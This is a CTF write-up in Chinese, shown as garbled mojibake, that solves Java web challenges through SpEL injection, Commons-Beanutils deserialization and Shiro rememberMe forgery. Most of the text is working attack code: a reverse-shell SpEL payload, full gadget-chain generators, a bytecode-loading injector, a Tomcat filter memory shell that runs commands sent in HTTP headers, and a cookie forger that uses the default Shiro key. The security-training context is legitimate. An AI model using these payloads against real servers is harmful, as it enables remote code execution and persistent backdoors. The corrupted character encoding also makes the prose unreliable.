ä¸€çœ¼SPELè¡¨è¾¾å¼æ³¨å…¥ï¼Œç›´æ¥æ‰“shellåå¼¹ï¼šT(java.lang.Runtime).getRuntime().exec(&quot;bash -c &#123;echo,xxxxxxxxxxxxxxxxxxx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;) ç»“æœå‘ç°æœºå­ä¸å‡ºç½‘ï¼Œäºæ˜¯åªèƒ½æ”¹æˆç›´æ¥è¯»flagäº†ï¼šnew java.io.BufferedReader(new java.io.InputStreamReader(new ProcessBuilder(new String[]&#123;&quot;bash&quot;,&quot;-c&quot;,&quot;cat /app/flag.txt&quot;&#125;).start().getInputStream(), &quot;gbk&quot;)).readLine() CBé“¾ä¸‹è¾¹æ˜¯Controller ååºåˆ—åŒ–ä¹Ÿæ²¡æœ‰ä»€ä¹ˆè¿‡æ»¤ï¼Œä½†ç›´æ¥æ‰“CBé“¾çš„è¯ä¼šå‘ç°æœºå­ä¸å‡ºç½‘ï¼Œå› æ­¤åªèƒ½æ‰“å†…å­˜é©¬ï¼ˆç½‘ä¸Šæœ‰äº›äººå†™åå¼¹shellæˆåŠŸçš„ï¼Œä¸æ¸…æ¥šæ€ä¹ˆæå¾—ï¼Œå¯èƒ½æ¯”èµ›çš„æ—¶å€™å’Œé¶åœºé‡Œçš„ç¯å¢ƒä¸ä¸€æ ·ï¼Ÿï¼Ÿï¼Ÿï¼‰ ä½†ç›´æ¥æ‰“ä¼ ç»Ÿçš„å†…å­˜é©¬ä¼šå‘ç°æ‰“ä¸è¿›å»ï¼Œåº”è¯¥æ˜¯payloadå¤ªé•¿äº†ï¼Œè¢«tomcaté™åˆ¶ä½äº†ï¼Œä¸‹é¢å­¦ä¹ ä¸€ä¸‹å®˜æ–¹çš„ç»•è¿‡æ‰‹æ³• ä¸‹è¾¹è¿™ä¸ªå°±æ˜¯ä¸ªçº¯çš„CBä¾èµ–æ‰“æ³•çš„é“¾å­ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import org.apache.commons.beanutils.BeanComparator;import java.io.*;import java.lang.reflect.Field;import java.util.Base64;import java.util.PriorityQueue;public class EXP &#123; public static void main(String[] args) throws Exception &#123; final TemplatesImpl templates = createTemplatesImpl(MyClassLoader.class); // mock method name until armed final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER); // create queue with numbers and basic comparator final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator); // stub data for replacement later queue.add(&quot;1&quot;); queue.add(&quot;1&quot;); // switch method called by comparator setFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;); // switch contents of queue final Object[] queueArray = (Object[]) getFieldValue(queue, &quot;queue&quot;); queueArray[0] = templates; queueArray[1] = templates; ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(queue); byte[] bytes = byteArrayOutputStream.toByteArray(); System.out.println(Base64.getEncoder().encodeToString(bytes)); &#125; public static &lt;T&gt; T createTemplatesImpl(Class c) throws Exception &#123; Class&lt;T&gt; tplClass = null; if (Boolean.parseBoolean(System.getProperty(&quot;properXalan&quot;, &quot;false&quot;))) &#123; tplClass = (Class&lt;T&gt;) Class.forName(&quot;org.apache.xalan.xsltc.trax.TemplatesImpl&quot;); &#125; else &#123; tplClass = (Class&lt;T&gt;) TemplatesImpl.class; &#125; final T templates = tplClass.newInstance(); final byte[] classBytes = classAsBytes(c); setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123; classBytes &#125;); setFieldValue(templates, &quot;_name&quot;, &quot;Pwnr&quot;); return templates; &#125; public static void setFieldValue(Object obj, String fieldName, Object fieldValue) throws NoSuchFieldException, IllegalAccessException &#123; Class clazz = obj.getClass(); Field classField = clazz.getDeclaredField(fieldName); classField.setAccessible(true); classField.set(obj, fieldValue); &#125; public static Object getFieldValue(Object obj, String fieldName) throws NoSuchFieldException, IllegalAccessException &#123; Class&lt;?&gt; clazz = obj.getClass(); Field classField = clazz.getDeclaredField(fieldName); classField.setAccessible(true); return classField.get(obj); &#125; public static byte[] classAsBytes(final Class&lt;?&gt; clazz) &#123; try &#123; final byte[] buffer = new byte[1024]; final String file = classAsFile(clazz); final InputStream in = clazz.getClassLoader().getResourceAsStream(file); if (in == null) &#123; throw new IOException(&quot;couldn&#x27;t find &#x27;&quot; + file + &quot;&#x27;&quot;); &#125; final ByteArrayOutputStream out = new ByteArrayOutputStream(); int len; while ((len = in.read(buffer)) != -1) &#123; out.write(buffer, 0, len); &#125; return out.toByteArray(); &#125; catch (IOException e) &#123; throw new RuntimeException(e); &#125; &#125; public static String classAsFile(final Class&lt;?&gt; clazz) &#123; return classAsFile(clazz, true); &#125; public static String classAsFile(final Class&lt;?&gt; clazz, boolean suffix) &#123; String str; if (clazz.getEnclosingClass() == null) &#123; str = clazz.getName().replace(&quot;.&quot;, &quot;/&quot;); &#125; else &#123; str = classAsFile(clazz.getEnclosingClass(), false) + &quot;$&quot; + clazz.getSimpleName(); &#125; if (suffix) &#123; str += &quot;.class&quot;; &#125; return str; &#125;&#125; å…¶ä¸­MyClassLoaderç±»å†…å®¹å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import java.util.Base64;public class MyClassLoader extends AbstractTranslet &#123; static&#123; try&#123; javax.servlet.http.HttpServletRequest request = ((org.springframework.web.context.request.ServletRequestAttributes)org.springframework.web.context.request.RequestContextHolder.getRequestAttributes()).getRequest(); java.lang.reflect.Field r=request.getClass().getDeclaredField(&quot;request&quot;); r.setAccessible(true); org.apache.catalina.connector.Response response =((org.apache.catalina.connector.Request) r.get(request)).getResponse(); javax.servlet.http.HttpSession session = request.getSession(); String classData=request.getParameter(&quot;classData&quot;); System.out.println(&quot;classData:&quot;+classData); byte[] classBytes = Base64.getDecoder().decode(classData); java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;,new Class[]&#123;byte[].class, int.class, int.class&#125;); defineClassMethod.setAccessible(true); Class cc = (Class) defineClassMethod.invoke(MyClassLoader.class.getClassLoader(), classBytes, 0,classBytes.length); cc.newInstance().equals(new Object[]&#123;request,response,session&#125;); &#125;catch(Exception e)&#123; e.printStackTrace(); &#125; &#125; public void transform(DOM arg0, SerializationHandler[] arg1) throws TransletException &#123; &#125; public void transform(DOM arg0, DTMAxisIterator arg1, SerializationHandler arg2) throws TransletException &#123; &#125;&#125; å¤§ä½“æ„æ€å°±æ˜¯è·å–è¯·æ±‚ä¹‹åï¼ŒåŠ è½½classDataä¼ è¿›æ¥çš„ç±»ï¼Œå¹¶æŠŠè¯·æ±‚ä¼šè¯è¿™ç§ç›´æ¥å½“ä½œå‚æ•°ä¼ ç»™å†…å­˜é©¬ åœ¨ä¼ å‚user&#x3D;EXPçš„è¾“å‡º(URLç¼–ç )çš„åŒæ—¶ï¼Œä¼ å‚classData&#x3D;ä¸‹è¾¹å†…å­˜é©¬çš„base64ç¼–ç (åŒæ ·ä¹Ÿurlencodeäº†ä¸€ä¸‹)ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687import javax.servlet.*;import java.io.BufferedReader;import java.io.IOException;import java.io.InputStream;import java.io.InputStreamReader;import java.util.stream.Collectors;public class FilterMem implements javax.servlet.Filter&#123; private javax.servlet.http.HttpServletRequest request = null; private org.apache.catalina.connector.Response response = null; private javax.servlet.http.HttpSession session =null; @Override public void init(FilterConfig filterConfig) throws ServletException &#123; &#125; public void destroy() &#123;&#125; @Override public void doFilter(ServletRequest request1, ServletResponse response1, FilterChain filterChain) throws IOException, ServletException &#123; javax.servlet.http.HttpServletRequest request = (javax.servlet.http.HttpServletRequest)request1; javax.servlet.http.HttpServletResponse response = (javax.servlet.http.HttpServletResponse)response1; javax.servlet.http.HttpSession session = request.getSession(); String cmd = request.getHeader(&quot;Polar-CMD&quot;); System.out.println(cmd); if (cmd != null) &#123; //System.out.println(&quot;1&quot;); response.setHeader(&quot;Polar-START&quot;, &quot;OK&quot;); // ä½¿ç”¨ ProcessBuilder æ‰§è¡Œå‘½ä»¤ Process process = new ProcessBuilder(cmd.split(&quot;\\\\s+&quot;)) .redirectErrorStream(true) .start(); //System.out.println(&quot;2&quot;); // è·å–å‘½ä»¤æ‰§è¡Œçš„è¾“å…¥æµ InputStream inputStream = process.getInputStream(); // ä½¿ç”¨ Java 8 Stream å°†è¾“å…¥æµè½¬æ¢ä¸ºå­—ç¬¦ä¸² String result = new BufferedReader(new InputStreamReader(inputStream)) .lines() .collect(Collectors.joining(System.lineSeparator())); System.out.println(&quot;3&quot;); response.setHeader(&quot;Polar-RESULT&quot;,result); &#125; else &#123; filterChain.doFilter(request, response); &#125; &#125; public boolean equals(Object obj) &#123; Object[] context=(Object[]) obj; this.session = (javax.servlet.http.HttpSession ) context[2]; this.response = (org.apache.catalina.connector.Response) context[1]; this.request = (javax.servlet.http.HttpServletRequest) context[0]; try &#123; dynamicAddFilter(new FilterMem(),&quot;Shell&quot;,&quot;/*&quot;,request); &#125; catch (IllegalAccessException e) &#123; e.printStackTrace(); &#125; return true; &#125; public static void dynamicAddFilter(javax.servlet.Filter filter,String name,String url,javax.servlet.http.HttpServletRequest request) throws IllegalAccessException &#123; javax.servlet.ServletContext servletContext=request.getServletContext(); if (servletContext.getFilterRegistration(name) == null) &#123; java.lang.reflect.Field contextField = null; org.apache.catalina.core.ApplicationContext applicationContext =null; org.apache.catalina.core.StandardContext standardContext=null; java.lang.reflect.Field stateField=null; javax.servlet.FilterRegistration.Dynamic filterRegistration =null; try &#123; contextField=servletContext.getClass().getDeclaredField(&quot;context&quot;); contextField.setAccessible(true); applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(servletContext); contextField=applicationContext.getClass().getDeclaredField(&quot;context&quot;); contextField.setAccessible(true); standardContext= (org.apache.catalina.core.StandardContext) contextField.get(applicationContext); stateField=org.apache.catalina.util.LifecycleBase.class.getDeclaredField(&quot;state&quot;); stateField.setAccessible(true); stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP); filterRegistration = servletContext.addFilter(name, filter); filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false,new String[]&#123;url&#125;); java.lang.reflect.Method filterStartMethod = org.apache.catalina.core.StandardContext.class.getMethod(&quot;filterStart&quot;); filterStartMethod.setAccessible(true); filterStartMethod.invoke(standardContext, null); stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED); &#125;catch (Exception e)&#123; &#125;finally &#123; stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED); &#125; &#125; &#125;&#125; ä¸Šè¾¹è¿™ä¸ªå°±æ˜¯ä¸ªæ™®é€šçš„tomcatçš„filterå†…å­˜é©¬ ä¸ºäº†æ–¹ä¾¿æˆªå›¾æˆ‘æŠŠuserçš„å†…å®¹åˆ äº†ä¸€éƒ¨åˆ†ï¼Œä¸‹è¾¹çš„å›¾ä»…æ˜¯ä¼ å‚ç¤ºä¾‹ï¼š ä¹‹åä»HTTP headerä¸­è®¾ç½®å‘½ä»¤å°±å¥½äº†ï¼š PolarOAè¿›å»æ˜¯ä¸ªç™»å½•æ¡† éšä¾¿è¾“ä¸€è¾“æŠ“åŒ…çœ‹çœ‹ï¼š ä¸€çœ¼shiro ç›´æ¥ä¸Šå·¥å…·æ¢­å“ˆ æ„é€ é“¾è¿™é‡Œä¼¼ä¹çˆ†ç ´çš„æœ‰ç‚¹é—®é¢˜ï¼Œæœ‰ç‚¹æ€ªï¼Œçˆ†ç ´ä¸å‡ºæ¥ï¼Œè¿˜ä¸ç»™æºç ï¼Œæˆ‘æ€ä¹ˆçŸ¥é“CBä¾èµ–æ˜¯ä»€ä¹ˆç‰ˆæœ¬çš„ï¼Œä¸‹è¾¹æ˜¯å‡ºé¢˜äººçš„è§£é‡Šï¼š ä¹‹åæˆ‘å»çœ‹äº†çœ‹ä¹‹å‰è‡ªå·±æ­çš„shiro 1.2.4çš„ç‰ˆæœ¬ï¼Œå‘ç°ç¡®å®è‡ªå¸¦çš„CBä¾èµ–å°±æ˜¯1.8.3ç‰ˆæœ¬çš„ï¼Œå¯èƒ½æ˜¯ä¸ªå°trickå§ï¼Œé‚£ä¹ˆæ‰“çº¯CBä¾èµ–å°±å¥½äº†ï¼Œä¸Šè¾¹CBé“¾é‚£ä¸ªé¢˜å…ˆæ‹¿è¿‡æ¥è¯•ä¸€è¯•ï¼Œå‘ç°ä¹Ÿæ˜¯é•¿äº†ï¼Œé‚£å°±å…ˆæ‰“ä¸€ä¸‹å‡ºç½‘å§ï¼Œç»“æœæ‰“å®Œå‘ç°ä¸å‡ºç½‘ å…ˆæŠŠé©¬è´´å‡ºæ¥å§ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677package shiropoc;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import javassist.*;import java.io.IOException;public class DynamicClassGenerator &#123; public CtClass genPayloadForWin() throws NotFoundException, CannotCompileException, IOException &#123; ClassPool classPool = ClassPool.getDefault(); CtClass clazz = classPool.makeClass(&quot;Exp&quot;); if ((clazz.getDeclaredConstructors()).length != 0) &#123; clazz.removeConstructor(clazz.getDeclaredConstructors()[0]); &#125; clazz.addConstructor(CtNewConstructor.make(&quot;public SpringEcho() throws Exception &#123;\\n&quot; + &quot; try &#123;\\n&quot; + &quot; org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();\\n&quot; + &quot; javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();\\n&quot; + &quot; javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();\\n&quot; + &quot;\\n&quot; + &quot; String te = httprequest.getHeader(\\&quot;Host\\&quot;);\\n&quot; + &quot; httpresponse.addHeader(\\&quot;Host\\&quot;, te);\\n&quot; + &quot; String tc = httprequest.getHeader(\\&quot;CMD\\&quot;);\\n&quot; + &quot; if (tc != null &amp;&amp; !tc.isEmpty()) &#123;\\n&quot; + &quot; String[] cmd = new String[]&#123;\\&quot;cmd.exe\\&quot;, \\&quot;/c\\&quot;, tc&#125;; \\n&quot; + &quot; byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(\\&quot;\\\\\\\\A\\&quot;).next().getBytes();\\n&quot; + &quot; httpresponse.getWriter().write(new String(result));\\n&quot; + &quot;\\n&quot; + &quot; &#125;\\n&quot; + &quot; httpresponse.getWriter().flush();\\n&quot; + &quot; httpresponse.getWriter().close();\\n&quot; + &quot; &#125; catch (Exception e) &#123;\\n&quot; + &quot; e.getStackTrace();\\n&quot; + &quot; &#125;\\n&quot; + &quot; &#125;&quot;, clazz)); // å…¼å®¹ä½ç‰ˆæœ¬jdk clazz.getClassFile().setMajorVersion(50); CtClass superClass = classPool.get(AbstractTranslet.class.getName()); clazz.setSuperclass(superClass); return clazz; &#125; public CtClass genPayloadForLinux() throws NotFoundException, CannotCompileException &#123; ClassPool classPool = ClassPool.getDefault(); CtClass clazz = classPool.makeClass(&quot;Exp&quot;); if ((clazz.getDeclaredConstructors()).length != 0) &#123; clazz.removeConstructor(clazz.getDeclaredConstructors()[0]); &#125; clazz.addConstructor(CtNewConstructor.make(&quot;public SpringEcho() throws Exception &#123;\\n&quot; + &quot; try &#123;\\n&quot; + &quot; org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();\\n&quot; + &quot; javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();\\n&quot; + &quot; javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();\\n&quot; + &quot;\\n&quot; + &quot; String te = httprequest.getHeader(\\&quot;Host\\&quot;);\\n&quot; + &quot; httpresponse.addHeader(\\&quot;Host\\&quot;, te);\\n&quot; + &quot; String tc = httprequest.getHeader(\\&quot;CMD\\&quot;);\\n&quot; + &quot; if (tc != null &amp;&amp; !tc.isEmpty()) &#123;\\n&quot; + &quot; String[] cmd = new String[]&#123;\\&quot;/bin/sh\\&quot;, \\&quot;-c\\&quot;, tc&#125;;\\n&quot; + &quot; byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(\\&quot;\\\\\\\\A\\&quot;).next().getBytes();\\n&quot; + &quot; httpresponse.getWriter().write(new String(result));\\n&quot; + &quot;\\n&quot; + &quot; &#125;\\n&quot; + &quot; httpresponse.getWriter().flush();\\n&quot; + &quot; httpresponse.getWriter().close();\\n&quot; + &quot; &#125;\\n&quot; + &quot; &#125;&quot;, clazz)); // å…¼å®¹ä½ç‰ˆæœ¬jdk clazz.getClassFile().setMajorVersion(50); CtClass superClass = classPool.get(AbstractTranslet.class.getName()); clazz.setSuperclass(superClass); return clazz; &#125;&#125; ç„¶åæ˜¯çº¯CBä¾èµ–çš„é“¾å­ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647package shiropoc;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import javassist.CtClass;import org.apache.commons.beanutils.BeanComparator;import java.io.ByteArrayOutputStream;import java.io.FileOutputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.util.PriorityQueue;//shiroæ— ä¾èµ–åˆ©ç”¨é“¾ï¼Œä½¿ç”¨shiro1.2.4è‡ªå¸¦çš„cb 1.8.3public class POC &#123; public static void main(String[] args) throws Exception &#123; com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl templates = getTemplate(); final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER); final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator); // stub data for replacement later queue.add(&quot;1&quot;); queue.add(&quot;1&quot;); setFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;); setFieldValue(queue, &quot;queue&quot;, new Object[]&#123;templates, templates&#125;); // ================== // ç”Ÿæˆåºåˆ—åŒ–å­—ç¬¦ä¸² ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\shiro_CB.txt&quot;)); oos.writeObject(queue); &#125; public static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl getTemplate() throws Exception &#123; DynamicClassGenerator classGenerator =new DynamicClassGenerator(); CtClass clz = classGenerator.genPayloadForLinux(); com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl obj = new com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl(); setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;clz.toBytecode()&#125;); setFieldValue(obj, &quot;_name&quot;, &quot;a&quot;); setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl()); return obj; &#125; public static void setFieldValue(Object obj, String fieldName, Object fieldValue) throws NoSuchFieldException, IllegalAccessException &#123; Class clazz = obj.getClass(); Field classField = clazz.getDeclaredField(fieldName); classField.setAccessible(true); classField.set(obj, fieldValue); &#125;&#125; å› ä¸ºæ‡’å¾—é…shiroç¯å¢ƒäº†ï¼Œç›´æ¥ç”¨ä¹‹å‰çš„pythonè„šæœ¬ç»™AESåŠ å¯†äº†ï¼š 12345678910111213141516171819import uuidimport base64from Crypto.Cipher import AESdef encode_rememberme(): f = open(&#x27;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\shiro_CB.txt&#x27;,&#x27;rb&#x27;) BS = AES.block_size pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() key = base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;) #å¯†é’¥ iv = uuid.uuid4().bytes encryptor = AES.new(key, AES.MODE_CBC, iv) file_body = pad(f.read()) base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)) return base64_ciphertextif __name__ == &#x27;__main__&#x27;: payload = encode_rememberme() print(&quot;rememberMe=&#123;0&#125;&quot;.format(payload.decode())) ä»¥ä¸Šçš„æµç¨‹èµ°å®Œæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥æ‰“äº†ï¼Œå› ä¸ºæ˜¯åŠ¨æ€çš„ï¼Œæ‰€ä»¥ç›´æ¥ä»HTTP headerä¸­æ·»åŠ CMDç„¶åå‘½ä»¤æ‰§è¡Œå°±å¥½äº† ä¸Šè¾¹çš„æµç¨‹èµ°å®Œï¼Œæˆ‘ä»¬ä¼šå‘ç°rememberMeçš„é•¿åº¦åœ¨3300ä»¥å†…ï¼Œå½“ç„¶æ˜¯ç¬¦åˆé¢˜ç›®è¦æ±‚çš„ï¼Œç„¶è€Œï¼Œ æˆ‘ä»¬è¿˜å¯ä»¥å¯¹é“¾å­å†æ¬¡ç¼©å‡ï¼ˆè¿™é‡Œå·å­¦p0lar1ghtå¸ˆå‚…çš„åšå®¢rwctf_Old-shiroé¢˜è§£ | P0l@R19ht (p0lar1ght.github.io)ï¼‰ï¼Œç¼©å‡åçš„é“¾å­é•¿åº¦å¤§çº¦åœ¨2800ä»¥å†… 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970package shiropoc;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import javassist.*;import org.apache.commons.beanutils.BeanComparator;import java.io.FileOutputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.util.PriorityQueue;public class POC_short &#123; public static void main(String[] args) throws Exception &#123; com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl templates = getTemplate(); final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER); final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator); // stub data for replacement later queue.add(&quot;1&quot;); queue.add(&quot;1&quot;); setFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;); setFieldValue(queue, &quot;queue&quot;, new Object[]&#123;templates, templates&#125;); // ================== // ç”Ÿæˆåºåˆ—åŒ–å­—ç¬¦ä¸² ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\shiro_CB.txt&quot;)); oos.writeObject(queue); &#125; public static CtClass genPayloadForLinux() throws CannotCompileException, NotFoundException &#123; ClassPool classPool = ClassPool.getDefault(); CtClass clazz = classPool.makeClass(&quot;A&quot;); if ((clazz.getDeclaredConstructors()).length != 0) &#123; clazz.removeConstructor(clazz.getDeclaredConstructors()[0]); &#125; clazz.addConstructor(CtNewConstructor.make(&quot;public B() throws Exception &#123;\\n&quot; + &quot; org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();\\n&quot; + &quot; javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();\\n&quot; + &quot; javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();\\n&quot; + &quot; String[] cmd = new String[]&#123;\\&quot;sh\\&quot;, \\&quot;-c\\&quot;, httprequest.getHeader(\\&quot;C\\&quot;)&#125;;\\n&quot; + &quot; byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(\\&quot;\\\\\\\\A\\&quot;).next().getBytes();\\n&quot; + &quot; httpresponse.getWriter().write(new String(result));\\n&quot; + &quot; httpresponse.getWriter().flush();\\n&quot; + &quot; httpresponse.getWriter().close();\\n&quot; + &quot; &#125;&quot;, clazz)); // å…¼å®¹ä½ç‰ˆæœ¬jdk clazz.getClassFile().setMajorVersion(50); CtClass superClass = classPool.get(AbstractTranslet.class.getName()); clazz.setSuperclass(superClass); return clazz; &#125; public static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl getTemplate() throws Exception &#123; CtClass clz = genPayloadForLinux(); com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl obj = new com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl(); setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;clz.toBytecode()&#125;); setFieldValue(obj, &quot;_name&quot;, &quot;a&quot;); setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl()); return obj; &#125; public static void setFieldValue(Object obj, String fieldName, Object fieldValue) throws NoSuchFieldException, IllegalAccessException &#123; Class clazz = obj.getClass(); Field classField = clazz.getDeclaredField(fieldName); classField.setAccessible(true); classField.set(obj, fieldValue); &#125;&#125; æˆ‘ä»¬æ¥å¯¹æ¯”ä¸€ä¸‹ç¼©å‡å‰åçš„å·®è·ï¼Œå…¶å®å’Œä¸Šè¾¹æ¯”èµ·æ¥å°±æ˜¯å°‘äº†ä¸ªç±»çš„å¼•ç”¨ï¼Œä½†å’Œæ­£å¸¸çš„ç»§æ‰¿AbstractTransletç±»çš„æ¯”èµ·æ¥ï¼Œå°‘äº†å¾ˆå¤šç±»çš„å¼•ç”¨ï¼ˆæ­£å¸¸ç»§æ‰¿ä¼šå¼ºåˆ¶é‡å†™ä¸€äº›æ–¹æ³•å¯¼è‡´å¢åŠ å­—ç¬¦ï¼‰ è™½ç„¶è¿™ä¸ªpayloadçŸ­äº†ä¸å°‘ï¼Œä½†æ‹¿å»æ‰“ä¸Šè¾¹é‚£ä¸ªå«CBé“¾çš„é¢˜æ˜¯ä¸è¡Œçš„ï¼Œå› ä¸ºæ‰“å®Œé“¾å­å°±ç›´æ¥æŠ¥500é”™è¯¯äº†ï¼Œçœ‹ä¸åˆ°å›æ˜¾ï¼Œå¦‚æœå†æ·»ä¸Šå†…å­˜é©¬ï¼Œé‚£ä¹ˆpayloadåˆé•¿äº†ï¼Œè¿˜æ˜¯ä¸è¡Œçš„ PolarOA2.0è¿™ä¸ªé¢˜æ˜¯ä¸Šè¾¹é‚£ä¸ªé¢˜çš„å‡çº§ç‰ˆï¼Œå¯†é’¥ä¸å†æ˜¯é»˜è®¤çš„é‚£ä¸ªäº†ï¼Œä¸‹è¾¹æœ‰ä¸¤ç§æ–¹æ³•æ¥è·å–å¯†é’¥ï¼Œæˆ‘ä»¬éƒ½æ¥çœ‹ä¸€çœ‹ æ–¹æ³•ä¸€ï¼šç›´æ¥çˆ†ç ´å¸¸è§å¯†é’¥ ä¸è¿‡è¿™é‡Œæœ‰ä¸ªé—®é¢˜ï¼Œé‚£å°±æ˜¯ä¸çŸ¥é“shiroçš„ç‰ˆæœ¬ï¼Œshiroåœ¨1.4.2ç‰ˆæœ¬ä¹‹åå¢åŠ äº†AES GCMåŠ å¯†ï¼Œå› æ­¤ä¸ç¡®å®šåº”ä¸åº”è¯¥å‹¾é€‰ï¼Œé‚£å°±å…ˆéƒ½çˆ†ç ´ä¸€éçœ‹çœ‹ ï¼ˆè¿™é‡Œå¾ˆå¥‡æ€ªï¼Œä¹‹å‰æˆ‘æ‰“å¼€çš„æ—¶å€™ï¼Œç¡®å®æ˜¯ä¸Šè¾¹çˆ†ç ´å‡ºæ¥äº†çš„ï¼Œä½†ä¹‹åç›´åˆ°çˆ†ç ´ç»“æŸä¹Ÿæ²¡çˆ†ç ´å‡ºæ¥ï¼Œå¯èƒ½ä¹‹å‰æ˜¯è¯¯æŠ¥ï¼Œå› ä¸ºå‡ºé¢˜äººä¹Ÿè¯´è¿™é¢˜æ˜¯çˆ†ä¸å‡ºæ¥çš„ï¼Œé‚£æˆ‘ä»¬å°±ç›´æ¥çœ‹ä¸‹è¾¹è¿™ç§æ–¹æ³•äº†ï¼‰ æ–¹æ³•äºŒï¼šçˆ†ç ´ç”¨æˆ·åå’Œå¯†ç  ç›´æ¥å¼±å£ä»¤admin:admin123ç™»å½• ç‰¹æ€§ï¼šShiroå¤§äº1.2.4çš„ç‰ˆæœ¬ä¸­ï¼Œåœ¨æ²¡æœ‰å¼€å‘äººå‘˜äººå·¥å¹²é¢„çš„æƒ…å†µä¸‹keyæ”¹ä¸ºäº†éšæœºç”Ÿæˆï¼Œè¿™ä¸ªéšæœºç”Ÿæˆæ˜¯åœ¨æ¯æ¬¡å¯åŠ¨Webç¯å¢ƒçš„æ—¶å€™ï¼Œé‡å¯å‰è¿™ä¸ªkeyä¸ä¼šæ”¹å˜ï¼Œå¯ä»¥åœ¨JVMè™šæ‹Ÿæœºå†…å­˜é‡Œæ‰¾åˆ°ï¼Œè€ŒSpringçš„heapdumpæ–‡ä»¶å°±æ˜¯ä»JVMè™šæ‹Ÿæœºå†…å­˜å¯¼å‡ºçš„ã€‚ å› æ­¤æˆ‘ä»¬å¯ä»¥å°è¯•ä»/actuator/heapdumpçœ‹çœ‹æœ‰æ²¡æœ‰æ–‡ä»¶æ³„éœ²ï¼Œç»“æœå‘ç°è¿˜çœŸæœ‰ï¼Œé‚£å°±ä¸‹è½½ä¸‹æ¥åˆ†æä¸€æ³¢ï¼š 